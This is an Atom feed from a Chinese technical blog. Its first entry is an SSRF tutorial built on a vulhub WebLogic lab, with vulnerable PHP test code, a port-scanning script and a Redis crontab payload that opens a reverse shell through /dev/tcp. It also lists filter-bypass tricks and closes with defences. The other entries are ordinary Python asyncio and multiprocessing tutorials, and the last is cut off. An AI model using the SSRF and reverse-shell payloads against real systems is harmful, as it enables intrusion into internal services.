<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Teams Six</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2019-12-22T12:31:07.697Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>Teams Six</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【漏洞笔记】浅谈SSRF原理及其利用</title>
    <link href="https://www.teamssix.com/year/191222-192227.html"/>
    <id>https://www.teamssix.com/year/191222-192227.html</id>
    <published>2019-12-22T11:22:27.000Z</published>
    <updated>2019-12-22T12:31:07.697Z</updated>
    
    <content type="html"><![CDATA[<p>声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。</p><h1 id="0x00-漏洞说明"><a href="#0x00-漏洞说明" class="headerlink" title="0x00 漏洞说明"></a>0x00 漏洞说明</h1><p>SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF1.png" alt></p><h1 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h1><p>上面简单介绍了一下SSRF的原理，那么SSRF能干什么，产生哪些危害呢？</p><p>利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等，可以说SSRF的危害不容小觑了。</p><h1 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h1><p>既然SSRF有这些危害，那我们要怎么发现哪里存在SSRF，发现了又怎么利用呢？接下来就好好唠唠这点。</p><p>可以这么说，能够对外发起网络请求的地方，就可能存在SSRF漏洞，下面的内容引用了先知社区的一篇文章，文章链接在底部。</p><p>具体可能出现SSRF的地方：</p><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h1 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h1><p>1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p><p>2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/a.php?image=(地址)</span><br></pre></td></tr></table></figure><h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="1、一个简单的测试靶场"><a href="#1、一个简单的测试靶场" class="headerlink" title="1、一个简单的测试靶场"></a>1、一个简单的测试靶场</h2><p>测试PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.38.132/ssrf.php?url=teamssix.com</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF2.png" alt></p><p>如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口</p><p>打开Burp，抓包发到Intruder，设置Payload位置</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF3.png" alt></p><p>将载荷类型设置为number，数字范围从1-65535，开始爆破</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF4.png" alt></p><p>根据响应长度及响应码，可以判断出80、3389是开放着的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF5.png" alt></p><h2 id="2、Weblogic漏洞复现"><a href="#2、Weblogic漏洞复现" class="headerlink" title="2、Weblogic漏洞复现"></a>2、Weblogic漏洞复现</h2><p>搭建环境参考：<a href="https://blog.csdn.net/qq_36374896/article/details/84102101" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84102101</a></p><p>搭建好之后，访问 IP:7001/uddiexplorer/ 即可访问，如果搭建在本机， IP 就是127.0.0.1。</p><h3 id="1、漏洞存在测试"><a href="#1、漏洞存在测试" class="headerlink" title="1、漏洞存在测试"></a>1、漏洞存在测试</h3><p>Weblogic 的 SSRF 漏洞地址在 /uddiexplorer/SearchPublicRegistries.jsp ，开启Burp代理后，来到漏洞地址，随便在搜索框里输点东西，点击 search 按钮抓包</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF6.png" alt></p><p>可以看到在请求包里的 operator 参数值为URL，说明此处可能存在SSRF漏洞</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF7.png" alt></p><p>将 operator 参数值为改为其他URL，再次进行发包测试</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF8.png" alt></p><p>把响应包翻到底部，可以很明显的看到靶机对我们修改后的URL进行了访问，接下来把URL端口修改一下，也就是让靶机请求一个不存在的地址</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF9.png" alt></p><p>这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。</p><h3 id="2、通过Redis服务反弹shell"><a href="#2、通过Redis服务反弹shell" class="headerlink" title="2、通过Redis服务反弹shell"></a>2、通过Redis服务反弹shell</h3><p>既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。</p><p>进入 redis服务 的shell，查看内网IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:~/vulhub/weblogic/ssrf# docker exec -it ssrf_redis_1 bash</span><br><span class="line">[root@5d9f91f455b6 /]# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  </span><br><span class="line">          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:129 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)</span><br></pre></td></tr></table></figure><p>知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?'</span></span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">data = <span class="string">'operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span>.format(port)</span><br><span class="line">r = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'Tried all'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">'\n\n[+] &#123;&#125; 发现端口\n\n'</span>.format(port))</span><br></pre></td></tr></table></figure><p>执行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~# python3 ssrf_portscan.py</span><br><span class="line">[+] 6379 发现端口</span><br></pre></td></tr></table></figure><p>通过扫描发现Redis服务的默认端口6373是开放的。</p><p>接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.0.2:6379/test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.10.30/4444 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF10.png" alt></p><p>如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。</p><p>如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF11.png" alt></p><h1 id="0x05-绕过技巧"><a href="#0x05-绕过技巧" class="headerlink" title="0x05 绕过技巧"></a>0x05 绕过技巧</h1><p>1、添加端口号：<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>2、短网址绕过：<a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p><p>3、IP限制绕过：十进制转换、八进制转换、十六进制转换、不同进制组合转换</p><p>4、协议限制绕过：当url协议限制只为http(s)时,可以利用follow redirect特性,构造302跳转服务,结合dict://,file://,gopher://</p><p>5、可以指向任意ip的域名：xip.io</p><p>6、@    <a href="http://abc@127.0.0.1" target="_blank" rel="noopener">http://abc@127.0.0.1</a></p><h1 id="0x06-SSRF防御"><a href="#0x06-SSRF防御" class="headerlink" title="0x06 SSRF防御"></a>0x06 SSRF防御</h1><p>1、过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2、统一错误信息,避免用户可以根据错误信息来判断远程服务器的端口状态。</p><p>3、限制请求的端口为http常用的端口,比如80,443,8080,8090</p><p>4、黑名单内网ip。避免应用被用来获取内网数据,攻击内网</p><p>5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章<br><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a><br><a href="http://www.liuwx.cn/penetrationtest-3.html" target="_blank" rel="noopener">http://www.liuwx.cn/penetrationtest-3.html</a><br><a href="https://www.cnblogs.com/yuzly/p/10903398.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/10903398.html</a><br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br><a href="https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;声明：本文仅用作技术交流学习分享用途，严禁将本文中涉及到的技术用法用于违法犯罪目的。&lt;/p&gt;
&lt;h1 id=&quot;0x00-漏洞说明&quot;&gt;&lt;a href=&quot;#0x00-漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞说明&quot;&gt;&lt;/a&gt;0x00 漏洞说明&lt;/h1&gt;&lt;p&gt;SSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统，既然是跳板，也就是表明攻击者是无法直接访问目标服务的，为了更好的理解这个过程，我从网上找了一张图，贴在了下面。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="SSRF" scheme="https://www.teamssix.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>【Python 学习笔记】 异步IO (asyncio) 协程</title>
    <link href="https://www.teamssix.com/year/191220-161745.html"/>
    <id>https://www.teamssix.com/year/191220-161745.html</id>
    <published>2019-12-20T08:17:45.000Z</published>
    <updated>2019-12-20T08:22:34.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前对协程早有耳闻，但一直没有去学习，今天就来学习一下协程，再次感谢莫烦的教程。</p><p>可以交给asyncio执行的任务被称为协程， asyncio 即异步的意思，在 Python3 中这是一个仅使用单线程就能达到多线程、多进程效果的工具。</p><p>在单线程中使用异步发起 IO 操作的时候，不需要等待 IO 的结束，在等待 IO 操作结束的这个空当儿可以继续做其他事情，结束的时候就会得到通知，所以能够很有效的利用等待下载的这段时间。</p><p>今天就来看看协程能不能干掉多线程和多进程。</p><a id="more"></a><h1 id="0x01-基本用法"><a href="#0x01-基本用法" class="headerlink" title="0x01 基本用法"></a>0x01 基本用法</h1><p>Python 的在 3.4 中引入了协程的概念，3.5 则确定了协程的语法，所以想使用协程处理 IO ，需要Python3.5 及以上的版本，下面是一个简单示例代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(t)</span>:</span></span><br><span class="line">    print(<span class="string">'开始第'</span>, t,<span class="string">'个任务'</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(t)  <span class="comment">#等待t秒</span></span><br><span class="line">    print(<span class="string">'第'</span>, t, <span class="string">'个任务执行了'</span>, t, <span class="string">'秒'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></span><br><span class="line">    tasks = [loop.create_task(job(t)) <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>)]     <span class="comment">#创建多个任务</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)    <span class="comment">#运行刚才创建的那些任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    loop = asyncio.get_event_loop()    <span class="comment">#创建事件循环</span></span><br><span class="line">    loop.run_until_complete(main(loop))    <span class="comment">#运行刚才创建的事件循环</span></span><br><span class="line">    loop.close()</span><br><span class="line">    print(<span class="string">"所有总共耗时"</span>, time.time() - start_time)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开始第 1 个任务</span><br><span class="line">开始第 2 个任务</span><br><span class="line">开始第 3 个任务</span><br><span class="line">第 1 个任务执行了 1 秒</span><br><span class="line">第 2 个任务执行了 2 秒</span><br><span class="line">第 3 个任务执行了 3 秒</span><br><span class="line">所有总共耗时 3.0029773712158203</span><br></pre></td></tr></table></figure><p>这里运行了三个任务，三个任务的执行时间加在一起是6秒，但是最后总共耗时是3秒，接下来就看看协程在爬虫中的使用。</p><h1 id="0x02-aiohttp的使用"><a href="#0x02-aiohttp的使用" class="headerlink" title="0x02 aiohttp的使用"></a>0x02 aiohttp的使用</h1><p>使用 aiohttp 模块可以将 requests 替换成一个异步的 requests ，下面先来看看一般的 requests 的使用，下面的运行结果耗时是我运行了三次，然后取平均数的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normal</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        r = requests.get(URL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">t1 = time.time()</span><br><span class="line">URL = <span class="string">'https://www.teamssix.com/'</span></span><br><span class="line">    normal()</span><br><span class="line">    print(<span class="string">"正常访问 3 次博客耗费时间"</span>, time.time()-t1)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><pre><code>正常访问 3 次博客耗费时间 12.872265259424845</code></pre><p>正常情况下，花费了近 13 秒，接下来使用 aiohttp 看看耗时多少。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(session)</span>:</span></span><br><span class="line">   response = <span class="keyword">await</span> session.get(<span class="string">'https://www.teamssix.com/'</span>)       <span class="comment"># 等待并切换</span></span><br><span class="line">   <span class="keyword">return</span> str(response.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(loop)</span>:</span></span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:      <span class="comment"># 官网推荐建立 Session 的形式</span></span><br><span class="line">       tasks = [loop.create_task(job(session)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">       finished, unfinished = <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">t1 = time.time()</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(main(loop))</span><br><span class="line">loop.close()</span><br><span class="line">print(<span class="string">"异步访问 3 次博客耗费时间"</span>, time.time() - t1)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">异步访问 3 次博客耗费时间 4.055158615112305</span><br></pre></td></tr></table></figure><p>从运行结果上来看使用 aiohttp 还是很给力的，接下来，看看多线程运行的时间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_test</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(URL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    URL = <span class="string">'https://www.teamssix.com/'</span></span><br><span class="line">    thread_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        t = threading.Thread(target=thread_test)</span><br><span class="line">        thread_list.append(t)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> thread_list:</span><br><span class="line">        i.join()</span><br><span class="line">    print(<span class="string">"多线程访问 3 次博客耗费时间"</span>, time.time()-t1)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.449431339899699</span><br></pre></td></tr></table></figure><p>可以看到 aiohttp 的速度还是要略快于多线程的，这里只是简单介绍了一下 aiohttp ，详细的可以参阅<a href="https://docs.python.org/zh-cn/3/library/asyncio.html" target="_blank" rel="noopener">官方文档</a>，想要使用的熟练还是需要大量练习，任重道远。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="https://www.jianshu.com/p/b5e347b3a17c" target="_blank" rel="noopener">https://www.jianshu.com/p/b5e347b3a17c</a><br><a href="https://segmentfault.com/a/1190000008814676" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008814676</a><br><a href="https://www.lylinux.net/article/2019/6/9/57.html" target="_blank" rel="noopener">https://www.lylinux.net/article/2019/6/9/57.html</a><br><a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-02-asyncio/" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-02-asyncio/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;之前对协程早有耳闻，但一直没有去学习，今天就来学习一下协程，再次感谢莫烦的教程。&lt;/p&gt;
&lt;p&gt;可以交给asyncio执行的任务被称为协程， asyncio 即异步的意思，在 Python3 中这是一个仅使用单线程就能达到多线程、多进程效果的工具。&lt;/p&gt;
&lt;p&gt;在单线程中使用异步发起 IO 操作的时候，不需要等待 IO 的结束，在等待 IO 操作结束的这个空当儿可以继续做其他事情，结束的时候就会得到通知，所以能够很有效的利用等待下载的这段时间。&lt;/p&gt;
&lt;p&gt;今天就来看看协程能不能干掉多线程和多进程。&lt;/p&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="https://www.teamssix.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="协程" scheme="https://www.teamssix.com/tags/%E5%8D%8F%E7%A8%8B/"/>
    
      <category term="异步IO" scheme="https://www.teamssix.com/tags/%E5%BC%82%E6%AD%A5IO/"/>
    
  </entry>
  
  <entry>
    <title>【Python 学习笔记】多进程爬虫</title>
    <link href="https://www.teamssix.com/year/191220-161533.html"/>
    <id>https://www.teamssix.com/year/191220-161533.html</id>
    <published>2019-12-20T08:15:33.000Z</published>
    <updated>2019-12-20T08:23:30.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段时间学习了多线程，但在实际的情况中对于多线程的速度实在不满意，所以今天就来学学多进程分布式爬虫，在这里感谢莫烦的Python教程。</p><h1 id="0x01-什么是多进程爬虫"><a href="#0x01-什么是多进程爬虫" class="headerlink" title="0x01 什么是多进程爬虫"></a>0x01 什么是多进程爬虫</h1><p>在讲述多进程之前，先来回顾一下之前学习的多线程。</p><a id="more"></a><p>对于多线程可以简单的理解成运输快递的货车，虽然在整个运输快递的途中有很多货车参与运输，但快递到你手中的时间并不会因为货车的数量增加而变化多少，甚至可能会因为参与运输的货车数量过多，导致送货时间变慢，因为货物在不断的上货卸货。<br>当然现实中可不会有人这么干，然而在计算机的世界里，有时却会犯这种错误，这也就是说多线程并不是越多越好。</p><p>如果有操作系统的基础，则对于线程与进程的理解会更深刻些，这里继续参照上面的例子，对于线程可以简单的理解成一个线程就是一个货车，而一个进程则是一整条快递运输线路上的货车集合，也就是说一个进程包含了多个线程。</p><p>如果在只有一个快递需要运输的时候，使用线程与进程的区别或许不大，但是如果有十件快递、百件快递，使用多进程无疑能够极大的提高效率。</p><h1 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02 准备工作"></a>0x02 准备工作</h1><p>在开始学习多进程之前，先来理一下爬虫思路，这里拿爬取我的博客文章举例，首先先用 requests 访问 temassix.com，之后利用 BeautifulSoup 解析出我博客中的文章链接，接着再利用 requests 访问文章，便完成了一个简单的爬虫。</p><p>接下来需要用到的模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time    <span class="comment">#测试爬取时间</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process   <span class="comment">#多进程模块</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><p>接下来需要用到的一些子函数：</p><figure class="highlight 